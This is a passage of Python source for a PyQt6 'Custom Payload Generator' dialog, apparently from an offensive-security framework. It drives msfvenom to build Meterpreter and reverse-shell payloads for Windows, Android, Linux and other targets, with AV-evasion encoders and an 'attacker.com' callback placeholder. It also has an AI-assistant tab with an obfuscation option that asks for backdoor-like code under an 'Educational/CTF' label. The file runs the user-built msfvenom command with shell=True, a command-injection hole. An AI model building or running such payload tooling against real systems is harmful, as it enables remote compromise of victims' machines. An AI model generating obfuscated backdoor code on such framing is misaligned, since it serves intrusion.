# widgets/custom_payload_dialog.py

import json
import re
import os
import subprocess
import threading
import shutil
import sys
from datetime import datetime
from pathlib import Path
from PyQt6.QtWidgets import (
    QDialog, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
    QPushButton, QTextEdit, QGroupBox, QSplitter,
    QMessageBox, QWidget, QApplication, QTabWidget,
    QFileDialog, QProgressBar, QComboBox, QCheckBox,
    QSpinBox, QFormLayout, QScrollArea, QFrame
)
from PyQt6.QtCore import Qt, pyqtSignal, QTimer, QThread
from PyQt6.QtGui import QFont, QColor, QTextCursor, QIntValidator, QKeySequence, QShortcut, QIcon, QAction


# ═══════════════════════════════════════════════════════════════════════════
# ENCODER DATABASE & CLASS
# ═══════════════════════════════════════════════════════════════════════════

ENCODER_DB = {
    "base64": {"name": "Base64", "description": "Encode to Base64"},
    "hex": {"name": "Hex", "description": "Encode to Hexadecimal"},
    "url": {"name": "URL", "description": "Encode to URL format"},
    "rot13": {"name": "ROT13", "description": "Encode to ROT13"},
    "base64_gzip": {"name": "Base64 + GZip", "description": "GZip compress then Base64"},
    "base64_xor": {"name": "Base64 + XOR", "description": "XOR then Base64"},
    "base64_rot13": {"name": "Base64 + ROT13", "description": "ROT13 then Base64"},
}

class PayloadEncoder:
    """Encode various payload formats"""
    
    @staticmethod
    def encode_base64(data: str) -> str:
        try:
            import base64
            encoded = base64.b64encode(data.encode('utf-8')).decode()
            return encoded
        except Exception as e:
            return f"[ERROR] Base64 encode: {e}"
    
    @staticmethod
    def encode_hex(data: str) -> str:
        try:
            encoded = data.encode('utf-8').hex()
            return encoded
        except Exception as e:
            return f"[ERROR] Hex encode: {e}"
    
    @staticmethod
    def encode_url(data: str) -> str:
        try:
            from urllib.parse import quote
            return quote(data)
        except Exception as e:
            return f"[ERROR] URL encode: {e}"
    
    @staticmethod
    def encode_rot13(data: str) -> str:
        try:
            import codecs
            return codecs.encode(data, 'rot_13')
        except Exception as e:
            return f"[ERROR] ROT13 encode: {e}"
    
    @staticmethod
    def encode_base64_gzip(data: str) -> str:
        try:
            import base64, gzip, io
            buffer = io.BytesIO()
            with gzip.GzipFile(fileobj=buffer, mode='w') as f:
                f.write(data.encode('utf-8'))
            compressed = buffer.getvalue()
            encoded = base64.b64encode(compressed).decode()
            return encoded
        except Exception as e:
            return f"[ERROR] Base64+GZip encode: {e}"
    
    @staticmethod
    def encode_base64_xor(data: str, key: int = 0x55) -> str:
        try:
            import base64
            xored = bytes([ord(c) ^ key for c in data])
            encoded = base64.b64encode(xored).decode()
            return encoded
        except Exception as e:
            return f"[ERROR] Base64+XOR encode: {e}"
    
    @staticmethod
    def encode_base64_rot13(data: str) -> str:
        try:
            import base64, codecs
            rot13 = codecs.encode(data, 'rot_13')
            encoded = base64.b64encode(rot13.encode('utf-8')).decode()
            return encoded
        except Exception as e:
            return f"[ERROR] Base64+ROT13 encode: {e}"


# ═══════════════════════════════════════════════════════════════════════════
# DECODER DATABASE & CLASS
# ═══════════════════════════════════════════════════════════════════════════

DECODER_DB = {
    "base64": {"name": "Base64", "description": "Decode Base64"},
    "hex": {"name": "Hex", "description": "Decode Hex"},
    "url": {"name": "URL", "description": "Decode URL"},
    "rot13": {"name": "ROT13", "description": "Decode ROT13"},
    "base64_gzip": {"name": "Base64 + GZip", "description": "Base64 + GZip decompress"},
    "base64_xor": {"name": "Base64 + XOR", "description": "Base64 + XOR (key: 0x55)"},
    "base64_rot13": {"name": "Base64 + ROT13", "description": "Base64 + ROT13 decode"},
    "multiple": {"name": "Multiple Layers", "description": "Try all decoders"},
}

class PayloadDecoder:
    """Decode various payload encodings"""
    
    @staticmethod
    def decode_base64(data: str) -> str:
        try:
            import base64
            missing_padding = len(data) % 4
            if missing_padding:
                data += '=' * (4 - missing_padding)
            decoded = base64.b64decode(data).decode('utf-8', errors='ignore')
            return decoded
        except Exception as e:
            return f"[ERROR] Base64 decode: {e}"
    
    @staticmethod
    def decode_hex(data: str) -> str:
        try:
            import re
            clean = re.sub(r'[\s\n\r\t]', '', data)
            clean = re.sub(r'[^0-9a-fA-F]', '', clean)
            if len(clean) == 0:
                return "[ERROR] Hex decode: Empty data"
            if len(clean) % 2 != 0:
                return f"[ERROR] Hex decode: Invalid length ({len(clean)})"
            decoded = bytes.fromhex(clean).decode('utf-8', errors='ignore')
            return decoded
        except ValueError as e:
            return f"[ERROR] Hex decode: {e}"
        except Exception as e:
            return f"[ERROR] Hex decode: {e}"
    
    @staticmethod
    def decode_url(data: str) -> str:
        try:
            from urllib.parse import unquote
            return unquote(data)
        except Exception as e:
            return f"[ERROR] URL decode: {e}"
    
    @staticmethod
    def decode_rot13(data: str) -> str:
        try:
            import codecs
            return codecs.decode(data, 'rot_13')
        except Exception as e:
            return f"[ERROR] ROT13 decode: {e}"
    
    @staticmethod
    def decode_base64_gzip(data: str) -> str:
        try:
            import base64, gzip, io
            missing_padding = len(data) % 4
            if missing_padding:
                data += '=' * (4 - missing_padding)
            decoded = base64.b64decode(data)
            with gzip.GzipFile(fileobj=io.BytesIO(decoded)) as f:
                result = f.read().decode('utf-8', errors='ignore')
            return result
        except Exception as e:
            return f"[ERROR] Base64+GZip decode: {e}"
    
    @staticmethod
    def decode_base64_xor(data: str, key: int = 0x55) -> str:
        try:
            import base64
            missing_padding = len(data) % 4
            if missing_padding:
                data += '=' * (4 - missing_padding)
            decoded = base64.b64decode(data)
            xored = bytes([b ^ key for b in decoded])
            return xored.decode('utf-8', errors='ignore')
        except Exception as e:
            return f"[ERROR] Base64+XOR decode: {e}"
    
    @staticmethod
    def decode_base64_rot13(data: str) -> str:
        try:
            import base64, codecs
            missing_padding = len(data) % 4
            if missing_padding:
                data += '=' * (4 - missing_padding)
            decoded = base64.b64decode(data).decode('utf-8', errors='ignore')
            return codecs.decode(decoded, 'rot_13')
        except Exception as e:
            return f"[ERROR] Base64+ROT13 decode: {e}"
    
    @staticmethod
    def decode_multiple(data: str) -> str:
        decoders = [
            ('Base64', PayloadDecoder.decode_base64),
            ('Hex', PayloadDecoder.decode_hex),
            ('URL', PayloadDecoder.decode_url),
            ('ROT13', PayloadDecoder.decode_rot13),
        ]
        results = [f"Trying multiple decoders...\n{'='*40}\n"]
        for name, func in decoders:
            try:
                result = func(data)
                if result and not result.startswith("[ERROR]") and result != data:
                    results.append(f"[{name}] SUCCESS:\n{result[:500]}{'...' if len(result) > 500 else ''}")
                    return '\n\n'.join(results)
                else:
                    results.append(f"[{name}] No change or failed")
            except:
                results.append(f"[{name}] Failed")
        results.append("\nAll decoders failed. Raw data:\n" + data[:500])
        return '\n'.join(results)
    
    @staticmethod
    def detect_encoding(data: str) -> dict:
        import re
        detections = {}
        clean_data = data.strip()
        
        b64_pattern = re.compile(r'^[A-Za-z0-9+/]+=*$')
        if b64_pattern.match(clean_data):
            detections['base64'] = {'confidence': 0.9, 'description': 'Valid Base64 characters'}
            try:
                import base64
                missing_padding = len(clean_data) % 4
                test_data = clean_data + '=' * (4 - missing_padding) if missing_padding else clean_data
                base64.b64decode(test_data)
                detections['base64']['valid'] = True
            except:
                detections['base64']['valid'] = False
        
        hex_pattern = re.compile(r'^[0-9a-fA-F\s]+$')
        if hex_pattern.match(clean_data):
            clean = re.sub(r'[\s]', '', clean_data)
            if len(clean) % 2 == 0 and len(clean) > 0:
                detections['hex'] = {'confidence': 0.85, 'description': 'Valid Hex characters'}
        
        if '%' in clean_data and re.search(r'%[0-9a-fA-F]{2}', clean_data):
            detections['url'] = {'confidence': 0.8, 'description': 'URL encoded'}
        
        letters = sum(1 for c in clean_data if c.isalpha())
        if len(clean_data) > 0 and letters > len(clean_data) * 0.6:
            detections['rot13'] = {'confidence': 0.6, 'description': 'Mostly alphabetic'}
        
        return detections


# ═══════════════════════════════════════════════════════════════════════════
# Helper: MSFVenom
# ═══════════════════════════════════════════════════════════════════════════

def is_msfvenom_available():
    candidates = []
    which = shutil.which("msfvenom")
    if which:
        candidates.append(which)
    for p in (
        "/usr/bin/msfvenom",
        "/usr/local/bin/msfvenom",
        "/opt/metasploit/bin/msfvenom",
        "/usr/share/metasploit-framework/bin/msfvenom",
        "/snap/bin/msfvenom",
    ):
        if p not in candidates and os.path.isfile(p) and os.access(p, os.X_OK):
            candidates.append(p)
    # Cukup path executable — jangan andalkan returncode --version
    return len(candidates) > 0


class MSFVenomWorker(QThread):
    output = pyqtSignal(str)
    progress = pyqtSignal(int)
    finished = pyqtSignal(bool, str, str)
    
    def __init__(self, payload, format_type, lhost, lport, encoder, iterations, output_path=None):
        super().__init__()
        self.payload = payload
        self.format_type = format_type
        self.lhost = lhost
        self.lport = lport
        self.encoder = encoder
        self.iterations = iterations
        self.output_path = output_path
        self._stop = False
        self.msfvenom_path = self._find_msfvenom()
        
    def _find_msfvenom(self):
        path = shutil.which("msfvenom")
        if path:
            return path
        for p in (
            "/usr/bin/msfvenom",
            "/usr/local/bin/msfvenom",
            "/opt/metasploit/bin/msfvenom",
            "/usr/share/metasploit-framework/bin/msfvenom",
            "/snap/bin/msfvenom",
        ):
            if os.path.isfile(p) and os.access(p, os.X_OK):
                return p
        return "msfvenom"
        
    def stop(self):
        self._stop = True
        
    def run(self):
        try:
            if not self._check_msfvenom():
                self.finished.emit(False, "msfvenom not found", "")
                return
            
            self.progress.emit(20)
            self.output.emit(f"🔨 Building {self.payload} payload...")
            
            if not self.output_path:
                ext_map = {
                    'apk': 'apk', 'exe': 'exe', 'elf': 'elf', 'dll': 'dll',
                    'msi': 'msi', 'dex': 'dex', 'war': 'war', 'asp': 'asp',
                    'aspx': 'aspx', 'jar': 'jar', 'py': 'py', 'raw': 'bin',
                    'php': 'php', 'vba': 'vba', 'js': 'js', 'rb': 'rb',
                    'pl': 'pl', 'go': 'go', 'c': 'c', 'cpp': 'cpp',
                    'ps1': 'ps1', 'hex': 'hex', 'vba-exe': 'vba',
                    'powershell': 'ps1', 'psh': 'ps1', 'psh-cmd': 'ps1',
                    'psh-net': 'ps1', 'psh-reflection': 'ps1', 'ruby': 'rb',
                    'perl': 'pl', 'python': 'py', 'rs': 'rs'
                }
                ext = ext_map.get(self.format_type, self.format_type)
                output_dir = Path.home() / 'msfvenom_payloads'
                output_dir.mkdir(parents=True, exist_ok=True)
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                self.output_path = str(output_dir / f'payload_{timestamp}.{ext}')
            
            cmd = f'"{self.msfvenom_path}" -p {self.payload}'
            # Android: jangan pakai -f apk (invalid format)
            no_format_payloads = (
                "android/meterpreter/reverse_tcp",
                "android/meterpreter/reverse_http",
                "android/meterpreter/reverse_https",
                "android/shell/reverse_tcp",
            )
            no_format_types = ("apk", "dex")

            if self.payload not in no_format_payloads and self.format_type not in no_format_types:
                cmd += f' -f {self.format_type}'

            cmd += f' -o "{self.output_path}"'

            if self.lhost:
                cmd += f' LHOST={self.lhost}'
            if self.lport:
                cmd += f' LPORT={self.lport}'
            if self.encoder and self.encoder != 'none':
                cmd += f' -e {self.encoder} -i {self.iterations}'
            
            self.progress.emit(40)
            self.output.emit(f"$ {cmd}")
            
            process = subprocess.Popen(
                cmd, shell=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                text=True,
                env=os.environ.copy()
            )
            
            while True:
                if self._stop:
                    process.terminate()
                    self.finished.emit(False, "Cancelled by user", "")
                    return
                line = process.stdout.readline()
                if line:
                    self.output.emit(line.strip())
                if process.poll() is not None:
                    break
                self.msleep(100)
            
            self.progress.emit(80)
            stdout, stderr = process.communicate()
            if stdout:
                self.output.emit(stdout.strip())
            
            if process.returncode == 0 and os.path.exists(self.output_path):
                file_size = os.path.getsize(self.output_path)
                self.output.emit(f"✅ Payload generated: {self.output_path} ({file_size} bytes)")
                self.progress.emit(100)
                self.finished.emit(True, "Success", self.output_path)
            else:
                error = stderr if stderr else stdout
                if not error:
                    error = "Unknown error"
                self.output.emit(f"❌ Error: {error}")
                self.finished.emit(False, error, "")
                
        except subprocess.TimeoutExpired:
            self.output.emit("❌ Timeout")
            self.finished.emit(False, "Timeout", "")
        except Exception as e:
            self.output.emit(f"❌ Error: {str(e)}")
            self.finished.emit(False, str(e), "")
    
    def _check_msfvenom(self):
        path = self.msfvenom_path
        if not path or path == "msfvenom":
            path = shutil.which("msfvenom") or "/usr/bin/msfvenom"
        if os.path.isfile(path) and os.access(path, os.X_OK):
            return True
        try:
            r = subprocess.run(
                [path, "--help"],
                capture_output=True,
                timeout=8,
                env=os.environ.copy(),
                text=True,
            )
            out = (r.stdout or "") + (r.stderr or "")
            return "msfvenom" in out.lower() or r.returncode in (0, 1)
        except Exception:
            return False


# ═══════════════════════════════════════════════════════════════════════════
# Payload Database
# ═══════════════════════════════════════════════════════════════════════════

PAYLOAD_DB = {
    "windows/meterpreter/reverse_tcp": {"platform": "Windows", "arch": "x86/x64", "default_port": 4444},
    "windows/meterpreter/reverse_https": {"platform": "Windows", "arch": "x86/x64", "default_port": 443},
    "windows/meterpreter/bind_tcp": {"platform": "Windows", "arch": "x86/x64", "default_port": 4444},
    "windows/shell_reverse_tcp": {"platform": "Windows", "arch": "x86/x64", "default_port": 4444},
    "windows/shell_bind_tcp": {"platform": "Windows", "arch": "x86/x64", "default_port": 4444},
    "windows/x64/meterpreter/reverse_tcp": {"platform": "Windows", "arch": "x64", "default_port": 4444},
    "windows/x64/shell_reverse_tcp": {"platform": "Windows", "arch": "x64", "default_port": 4444},
    "android/meterpreter/reverse_tcp": {"platform": "Android", "arch": "ARM", "default_port": 4444},
    "android/shell/reverse_tcp": {"platform": "Android", "arch": "ARM", "default_port": 4444},
    "linux/x86/meterpreter/reverse_tcp": {"platform": "Linux", "arch": "x86", "default_port": 4444},
    "linux/x64/meterpreter/reverse_tcp": {"platform": "Linux", "arch": "x64", "default_port": 4444},
    "linux/x86/shell_reverse_tcp": {"platform": "Linux", "arch": "x86", "default_port": 4444},
    "linux/x64/shell_reverse_tcp": {"platform": "Linux", "arch": "x64", "default_port": 4444},
    "php/meterpreter/reverse_tcp": {"platform": "PHP", "arch": "Any", "default_port": 4444},
    "php/shell_reverse_tcp": {"platform": "PHP", "arch": "Any", "default_port": 4444},
    "java/meterpreter/reverse_tcp": {"platform": "Java", "arch": "Any", "default_port": 4444},
    "java/shell_reverse_tcp": {"platform": "Java", "arch": "Any", "default_port": 4444},
    "python/meterpreter/reverse_tcp": {"platform": "Python", "arch": "Any", "default_port": 4444},
    "python/shell_reverse_tcp": {"platform": "Python", "arch": "Any", "default_port": 4444},
    "ruby/shell_reverse_tcp": {"platform": "Ruby", "arch": "Any", "default_port": 4444},
    "ruby/meterpreter/reverse_tcp": {"platform": "Ruby", "arch": "Any", "default_port": 4444},
    "perl/shell_reverse_tcp": {"platform": "Perl", "arch": "Any", "default_port": 4444},
    "cmd/windows/reverse_powershell": {"platform": "Windows", "arch": "Any", "default_port": 4444},
    "cmd/windows/bind_powershell": {"platform": "Windows", "arch": "Any", "default_port": 4444},
    "osx/x64/meterpreter/reverse_tcp": {"platform": "OSX", "arch": "x64", "default_port": 4444},
    "osx/x64/shell_reverse_tcp": {"platform": "OSX", "arch": "x64", "default_port": 4444},
}

FORMAT_DB = {
    "windows/meterpreter/reverse_tcp": ["exe", "dll", "raw", "ps1", "vba", "hex", "c", "python"],
    "windows/meterpreter/reverse_https": ["exe", "dll", "raw", "ps1", "vba"],
    "windows/meterpreter/bind_tcp": ["exe", "dll", "raw"],
    "windows/shell_reverse_tcp": ["exe", "dll", "raw", "ps1"],
    "windows/shell_bind_tcp": ["exe", "dll", "raw"],
    "windows/x64/meterpreter/reverse_tcp": ["exe", "dll", "raw"],
    "windows/x64/shell_reverse_tcp": ["exe", "dll", "raw"],
    "android/meterpreter/reverse_tcp": ["apk"],
    "android/shell/reverse_tcp": ["apk"],
    "linux/x86/meterpreter/reverse_tcp": ["elf", "python", "raw", "c"],
    "linux/x64/meterpreter/reverse_tcp": ["elf", "python", "raw", "c"],
    "linux/x86/shell_reverse_tcp": ["elf", "python", "raw"],
    "linux/x64/shell_reverse_tcp": ["elf", "python", "raw"],
    "php/meterpreter/reverse_tcp": ["php", "raw"],
    "php/shell_reverse_tcp": ["php", "raw"],
    "java/meterpreter/reverse_tcp": ["jar", "war", "raw"],
    "java/shell_reverse_tcp": ["jar", "war"],
    "python/meterpreter/reverse_tcp": ["py", "raw"],
    "python/shell_reverse_tcp": ["py", "raw"],
    "ruby/shell_reverse_tcp": ["rb", "raw"],
    "ruby/meterpreter/reverse_tcp": ["rb", "raw"],
    "perl/shell_reverse_tcp": ["pl", "raw"],
    "cmd/windows/reverse_powershell": ["ps1", "raw"],
    "cmd/windows/bind_powershell": ["ps1", "raw"],
    "osx/x64/meterpreter/reverse_tcp": ["elf", "raw"],
    "osx/x64/shell_reverse_tcp": ["elf", "raw"],
}

ENCODER_DB_MSF = {
    "none": "No encoding",
    "x86/shikata_ga_nai": "x86/shikata_ga_nai",
    "x86/jmp_call_additive": "x86/jmp_call_additive",
    "x86/call4_dword_xor": "x86/call4_dword_xor",
    "x86/alpha_mixed": "x86/alpha_mixed",
    "x86/alpha_upper": "x86/alpha_upper",
    "x64/xor": "x64/xor",
    "x64/zutto_dekiru": "x64/zutto_dekiru",
}


# ═══════════════════════════════════════════════════════════════════════════
# Main Dialog
# ═══════════════════════════════════════════════════════════════════════════

class CustomPayloadDialog(QDialog):
    
    def __init__(self, framework, gui, ai_assistant, parent=None):
        super().__init__(parent)
        self.framework = framework
        self.gui = gui
        self.ai = ai_assistant
        
        self.setWindowTitle("🔨 Custom Payload Generator")
        self.setModal(False)
        self.setMinimumSize(1200, 850)
        
        self.current_output = ""
        self.is_generating = False
        self.msf_worker = None
        self.msfvenom_available = is_msfvenom_available()
        
        self._poll_timer = QTimer()
        self._poll_count = 0
        
        self._is_hidden = False
        self._saved_height = None
        
        self._build_ui()
        
        if self.msfvenom_available:
            self.status_label.setText("🟢 MSFVenom Available")
            self.status_label.setStyleSheet("color: #50fa7b; font-size: 9pt; padding: 4px;")
        else:
            self.status_label.setText("⚠️ MSFVenom not found - AI mode only")
            self.status_label.setStyleSheet("color: #f1fa8c; font-size: 9pt; padding: 4px;")
        
        self._setup_shortcuts()
    
    def _setup_shortcuts(self):
        self._shortcut_hide = QShortcut(QKeySequence("Ctrl+H"), self)
        self._shortcut_hide.activated.connect(self._toggle_hide)
    
    def _toggle_hide(self):
        if self._is_hidden:
            self._show_content()
        else:
            self._hide_content()
    
    def _hide_content(self):
        if not self._is_hidden:
            self._saved_height = self.height()
            self.content_widget.hide()
            self.header_widget.setVisible(True)
            self.setFixedHeight(self.header_widget.height() + 30)
            self._is_hidden = True
            self.hide_btn.setText("□")
            self.hide_btn.setToolTip("Show (Ctrl+H)")
    
    def _show_content(self):
        if self._is_hidden:
            self.content_widget.show()
            self.header_widget.setVisible(True)
            if self._saved_height:
                self.setFixedHeight(self._saved_height)
            else:
                self.resize(1200, 850)
            self._is_hidden = False
            self.hide_btn.setText("─")
            self.hide_btn.setToolTip("Hide (Ctrl+H)")
    
    def _build_ui(self):
        main_layout = QVBoxLayout(self)
        main_layout.setContentsMargins(10, 10, 10, 10)
        main_layout.setSpacing(6)
        
        # ── Header Bar ──
        self.header_widget = QWidget()
        self.header_widget.setFixedHeight(40)
        self.header_widget.setStyleSheet("""
            QWidget {
                background: transparent;
                border-bottom: 1px solid #333333;
            }
        """)
        header_layout = QHBoxLayout(self.header_widget)
        header_layout.setContentsMargins(0, 0, 0, 0)
        header_layout.setSpacing(8)
        
        title_label = QLabel("🔨 Custom Payload Generator")
        title_label.setStyleSheet("""
            font-size: 11pt;
            font-weight: bold;
            color: #00ff00;
            background: transparent;
            border: none;
        """)
        header_layout.addWidget(title_label)
        header_layout.addStretch()
        
        self.hide_btn = QPushButton("─")
        self.hide_btn.setFixedSize(30, 26)
        self.hide_btn.setToolTip("Hide/Show (Ctrl+H)")
        self.hide_btn.setStyleSheet("""
            QPushButton {
                background: transparent;
                color: #555555;
                border: none;
                font-size: 14pt;
                font-weight: bold;
                padding: 0px;
            }
            QPushButton:hover {
                color: #ffffff;
                background: transparent;
            }
        """)
        self.hide_btn.clicked.connect(self._toggle_hide)
        header_layout.addWidget(self.hide_btn)
        
        main_layout.addWidget(self.header_widget)
        
        # ── Content ──
        self.content_widget = QWidget()
        self.content_widget.setStyleSheet("""
            QWidget {
                background: #0d1117;
                border: 1px solid #1a1a1a;
                border-radius: 4px;
            }
        """)
        content_layout = QVBoxLayout(self.content_widget)
        content_layout.setContentsMargins(10, 10, 10, 10)
        content_layout.setSpacing(6)
        
        # ── Main Splitter ──
        splitter = QSplitter(Qt.Orientation.Horizontal)
        
        # ── LEFT PANEL ──
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        left_layout.setContentsMargins(5, 5, 5, 5)
        left_layout.setSpacing(6)
        
        # Connection Settings
        conn_group = QGroupBox("🌐 Connection Settings")
        conn_group.setStyleSheet(self._group_style("#00ffff"))
        conn_layout = QFormLayout()
        
        self.lhost_input = QLineEdit()
        self.lhost_input.setPlaceholderText("192.168.1.100 or attacker.com")
        self.lhost_input.setStyleSheet(self._input_style())
        conn_layout.addRow("LHOST:", self.lhost_input)
        
        self.lport_input = QLineEdit()
        self.lport_input.setPlaceholderText("4444")
        self.lport_input.setText("4444")
        self.lport_input.setValidator(QIntValidator(1, 65535))
        self.lport_input.setStyleSheet(self._input_style())
        conn_layout.addRow("LPORT:", self.lport_input)
        
        conn_group.setLayout(conn_layout)
        left_layout.addWidget(conn_group)
        
        # ── Mode Tabs ──
        mode_group = QGroupBox("⚡ Generation Mode")
        mode_group.setStyleSheet(self._group_style("#ff0022"))
        mode_layout = QVBoxLayout()
        
        self.mode_tabs = QTabWidget()
        self.mode_tabs.setStyleSheet("""
            QTabWidget::pane {
                border: 1px solid #333333;
                border-radius: 4px;
                background: #0d1117;
            }
            QTabBar::tab {
                background: #1a1a1a;
                color: #858585;
                padding: 8px 20px;
                border: 1px solid #333333;
                border-bottom: none;
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
                font-size: 10pt;
            }
            QTabBar::tab:selected {
                background: #0d1117;
                color: #ffffff;
                border-bottom: 2px solid #ff0000;
            }
        """)
        
        # ── Tab 1: AI Generator ──
        ai_tab = self._build_ai_tab()
        self.mode_tabs.addTab(ai_tab, "🤖 AI Generator")
        
        # ── Tab 2: MSFVenom ──
        msf_tab = self._build_msf_tab()
        self.mode_tabs.addTab(msf_tab, "🔨 MSFVenom")
        
        # ── Tab 3: ENCODE ──
        encode_tab = self._build_encode_tab()
        self.mode_tabs.addTab(encode_tab, "🔒 Encode")
        
        # ── Tab 4: DECODE ──
        decode_tab = self._build_decode_tab()
        self.mode_tabs.addTab(decode_tab, "🔓 Decode")
        
        mode_layout.addWidget(self.mode_tabs)
        mode_group.setLayout(mode_layout)
        left_layout.addWidget(mode_group)
        
        # ── Generate Button ──
        gen_layout = QHBoxLayout()
        gen_layout.setSpacing(6)
        
        self.generate_btn = QPushButton("🚀 Generate")
        self.generate_btn.setMinimumHeight(45)
        self.generate_btn.setStyleSheet(self._button_style("#00ff00", "#000000"))
        self.generate_btn.clicked.connect(self._generate)
        gen_layout.addWidget(self.generate_btn)
        
        self.stop_btn = QPushButton("⏹️ Stop")
        self.stop_btn.setMinimumHeight(45)
        self.stop_btn.setStyleSheet(self._button_style("#ff0000", "#ffffff"))
        self.stop_btn.clicked.connect(self._stop_generation)
        self.stop_btn.setEnabled(False)
        gen_layout.addWidget(self.stop_btn)
        
        left_layout.addLayout(gen_layout)
        
        # ── Progress ──
        self.progress_bar = QProgressBar()
        self.progress_bar.setStyleSheet(self._progress_style())
        left_layout.addWidget(self.progress_bar)
        
        self.status_label = QLabel("🟢 Ready")
        self.status_label.setStyleSheet("color: #50fa7b; font-size: 9pt; padding: 4px;")
        left_layout.addWidget(self.status_label)
        
        left_layout.addStretch()
        
        # ── RIGHT PANEL ──
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        right_layout.setContentsMargins(5, 5, 5, 5)
        right_layout.setSpacing(6)
        
        # AI Conversation
        conv_group = QGroupBox("💬 AI Conversation")
        conv_group.setStyleSheet(self._group_style("#8be9fd"))
        conv_layout = QVBoxLayout()
        
        self.ai_conversation = QTextEdit()
        self.ai_conversation.setReadOnly(True)
        self.ai_conversation.setStyleSheet(self._textarea_style())
        self.ai_conversation.setMinimumHeight(150)
        conv_layout.addWidget(self.ai_conversation)
        
        conv_group.setLayout(conv_layout)
        right_layout.addWidget(conv_group)
        
        # Generated Output
        output_group = QGroupBox("💾 Generated Output")
        output_group.setStyleSheet(self._group_style("#ffff00"))
        output_layout = QVBoxLayout()
        
        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setStyleSheet(self._textarea_style())
        output_layout.addWidget(self.output_text)
        
        output_group.setLayout(output_layout)
        right_layout.addWidget(output_group)
        
        # Output Buttons
        btn_layout = QHBoxLayout()
        btn_layout.setSpacing(6)
        
        self.copy_btn = QPushButton("📋 Copy")
        self.copy_btn.clicked.connect(self._copy_output)
        self.copy_btn.setStyleSheet(self._button_style("#1f6feb", "#ffffff"))
        btn_layout.addWidget(self.copy_btn)
        
        self.save_btn = QPushButton("💾 Save")
        self.save_btn.clicked.connect(self._save_output)
        self.save_btn.setStyleSheet(self._button_style("#238636", "#ffffff"))
        btn_layout.addWidget(self.save_btn)
        
        self.open_folder_btn = QPushButton("📂 Open Folder")
        self.open_folder_btn.clicked.connect(self._open_output_folder)
        self.open_folder_btn.setStyleSheet(self._button_style("#da3633", "#ffffff"))
        btn_layout.addWidget(self.open_folder_btn)
        
        self.run_btn = QPushButton("▶ Run")
        self.run_btn.clicked.connect(self._run_code)
        self.run_btn.setStyleSheet(self._button_style("#1f6feb", "#ffffff"))
        btn_layout.addWidget(self.run_btn)
        
        btn_layout.addStretch()
        right_layout.addLayout(btn_layout)
        
        splitter.addWidget(left_panel)
        splitter.addWidget(right_panel)
        splitter.setSizes([450, 750])
        
        content_layout.addWidget(splitter)
        main_layout.addWidget(self.content_widget)
        
        self._on_payload_changed()
    
    # ═══════════════════════════════════════════════════════════════════════════
    # BUILD TABS
    # ═══════════════════════════════════════════════════════════════════════════
    
    def _build_ai_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setSpacing(8)
        
        desc_label = QLabel("Describe what you want:")
        desc_label.setStyleSheet("color: #8be9fd; font-weight: bold; font-size: 11pt;")
        layout.addWidget(desc_label)
        
        self.description_input = QTextEdit()
        self.description_input.setPlaceholderText(
            "Example for Educational/CTF purposes:\n"
            "Write a Python script that demonstrates:\n"
            "- TCP socket programming with encryption\n"
            "- Automatic reconnection with exponential backoff\n"
            "- Cross-platform compatibility\n"
            "- Error handling and heartbeat mechanism\n"
            "- Threading for concurrent operations"
        )
        self.description_input.setMinimumHeight(180)
        self.description_input.setStyleSheet(self._textarea_style())
        layout.addWidget(self.description_input)
        
        # Options
        options_layout = QHBoxLayout()
        options_layout.setSpacing(12)
        
        options_layout.addWidget(QLabel("Language:"))
        self.ai_language = QComboBox()
        self.ai_language.addItems([
            "Python", "Bash", "PowerShell", "PHP", "Perl", 
            "Ruby", "Go", "C", "C++", "JavaScript/Node.js", 
            "Java", "Rust", "Auto-detect"
        ])
        self.ai_language.setCurrentText("Python")
        self.ai_language.setStyleSheet(self._combo_style())
        options_layout.addWidget(self.ai_language)
        
        options_layout.addSpacing(20)
        
        self.obfuscate_cb = QCheckBox("Obfuscate")
        self.obfuscate_cb.setStyleSheet("color: #cccccc;")
        options_layout.addWidget(self.obfuscate_cb)
        
        self.comment_cb = QCheckBox("Include comments")
        self.comment_cb.setChecked(True)
        self.comment_cb.setStyleSheet("color: #cccccc;")
        options_layout.addWidget(self.comment_cb)
        
        options_layout.addStretch()
        layout.addLayout(options_layout)
        
        return tab
    
    def _build_msf_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setSpacing(6)
        
        if self.msfvenom_available:
            status = QLabel("✅ MSFVenom available")
            status.setStyleSheet("color: #50fa7b; font-size: 10pt; padding: 4px;")
        else:
            status = QLabel("⚠️ MSFVenom not found")
            status.setStyleSheet("color: #ff5555; font-size: 10pt; padding: 4px;")
        layout.addWidget(status)
        
        # Payload
        payload_layout = QHBoxLayout()
        payload_layout.addWidget(QLabel("Payload:"))
        self.msf_payload = QComboBox()
        self.msf_payload.addItems(sorted(PAYLOAD_DB.keys()))
        self.msf_payload.setStyleSheet(self._combo_style())
        self.msf_payload.currentTextChanged.connect(self._on_payload_changed)
        payload_layout.addWidget(self.msf_payload)
        layout.addLayout(payload_layout)
        
        # Format
        format_layout = QHBoxLayout()
        format_layout.addWidget(QLabel("Format:"))
        self.msf_format = QComboBox()
        self.msf_format.setStyleSheet(self._combo_style())
        format_layout.addWidget(self.msf_format)
        layout.addLayout(format_layout)
        
        # Encoder
        encoder_layout = QHBoxLayout()
        encoder_layout.addWidget(QLabel("Encoder:"))
        self.msf_encoder = QComboBox()
        self.msf_encoder.addItems(sorted(ENCODER_DB_MSF.keys()))
        self.msf_encoder.setStyleSheet(self._combo_style())
        encoder_layout.addWidget(self.msf_encoder)
        layout.addLayout(encoder_layout)
        
        # Iterations
        iter_layout = QHBoxLayout()
        iter_layout.addWidget(QLabel("Iterations:"))
        self.msf_iterations = QSpinBox()
        self.msf_iterations.setRange(1, 20)
        self.msf_iterations.setValue(1)
        self.msf_iterations.setStyleSheet(self._input_style())
        iter_layout.addWidget(self.msf_iterations)
        iter_layout.addStretch()
        layout.addLayout(iter_layout)
        
        self.payload_info = QLabel("Select a payload to see details")
        self.payload_info.setStyleSheet("color: #858585; font-size: 9pt; padding: 4px;")
        layout.addWidget(self.payload_info)
        
        layout.addStretch()
